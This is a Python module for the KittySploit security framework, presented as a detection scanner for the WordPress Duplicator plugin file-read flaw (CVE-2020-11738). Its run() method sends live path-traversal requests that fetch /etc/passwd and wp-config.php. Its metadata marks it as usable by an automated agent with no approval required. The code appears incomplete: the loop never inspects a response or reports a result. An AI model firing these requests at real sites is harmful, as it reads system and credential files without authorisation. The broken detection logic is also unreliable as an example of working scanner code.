#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Duplicator 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Duplicator 1.3.24 & 1.3.26 - Local File Inclusion Detection',
        'description': "WordPress Duplicator 1.3.24 & 1.3.26 are vulnerable to local file inclusion vulnerabilities that could allow attackers to download arbitrary files, such as the wp-config.php file. According to the vendor, the vulnerability was only in two versions v1.3.24 and v1.3.26, the vulnerability wasn't present in versions 1.3.22 and before.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'kev', 'tenable', 'packetstorm', 'wordpress', 'wp-plugin', 'lfi', 'snapcreek', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.tenable.com/blog/duplicator-wordpress-plugin-vulnerability-exploited-in-the-wild',
            'https://snapcreek.com/duplicator/docs/changelog/?lite',
            'https://www.wordfence.com/blog/2020/02/active-attack-on-recently-patched-duplicator-plugin-vulnerability-affects-over-1-million-sites/',
            'http://packetstormsecurity.com/files/160621/WordPress-Duplicator-1.3.26-Directory-Traversal-File-Read.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-11738',
        ],
        'cve': 'CVE-2020-11738',
    }

    def run(self):
        for path in ('/wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd', '/wp-admin/admin-ajax.php?action=duplicator_download&file=%2F..%2Fwp-config.php'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
